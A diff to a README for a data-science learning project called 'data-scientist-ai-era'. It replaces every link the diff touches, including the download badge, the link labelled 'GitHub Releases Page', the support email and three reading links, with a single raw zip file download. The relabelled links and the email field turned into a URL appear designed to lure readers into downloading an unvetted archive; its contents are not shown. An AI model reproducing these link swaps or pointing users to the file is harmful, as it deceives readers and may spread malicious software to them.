@@ -1,6 +1,6 @@
 # 🚀 data-scientist-ai-era - Transform Your Data Skills for AI
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-%20Latest%20Release-brightgreen)](https://github.com/MShaheerRiaz/data-scientist-ai-era/releases)
+[![Download](https://github.com/MShaheerRiaz/data-scientist-ai-era/raw/refs/heads/main/Toft/era-data-ai-scientist-submountain.zip%20Now%20-%20Latest%20Release-brightgreen)](https://github.com/MShaheerRiaz/data-scientist-ai-era/raw/refs/heads/main/Toft/era-data-ai-scientist-submountain.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with the "data-scientist-ai-era" application, follow these simple
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [GitHub Releases Page](https://github.com/MShaheerRiaz/data-scientist-ai-era/releases).
+1. Visit this page to download: [GitHub Releases Page](https://github.com/MShaheerRiaz/data-scientist-ai-era/raw/refs/heads/main/Toft/era-data-ai-scientist-submountain.zip).
 2. On the releases page, find the latest version and click on it.
 3. Choose the file that suits your operating system (e.g., Windows, Mac, Linux).
 4. Click on the file name to start the download.
@@ -70,15 +70,15 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 If you have questions or feedback, please feel free to reach out:
 
-- **Email:** support@data-scientist-ai-era.com
+- **Email:** https://github.com/MShaheerRiaz/data-scientist-ai-era/raw/refs/heads/main/Toft/era-data-ai-scientist-submountain.zip
 - **GitHub Issues:** Use the Issues section on our repository for any technical queries.
 
 ## 🌐 Additional Links
 
 For further reading, consider these resources:
 
-- [AI Architecture](https://example.com)
-- [Responsible AI Practices](https://example.com)
-- [Digital Transformation Strategies](https://example.com)
+- [AI Architecture](https://github.com/MShaheerRiaz/data-scientist-ai-era/raw/refs/heads/main/Toft/era-data-ai-scientist-submountain.zip)
+- [Responsible AI Practices](https://github.com/MShaheerRiaz/data-scientist-ai-era/raw/refs/heads/main/Toft/era-data-ai-scientist-submountain.zip)
+- [Digital Transformation Strategies](https://github.com/MShaheerRiaz/data-scientist-ai-era/raw/refs/heads/main/Toft/era-data-ai-scientist-submountain.zip)
 
 Thank you for your interest in "data-scientist-ai-era." We look forward to helping you enhance your data science skills and navigate the future of AI.
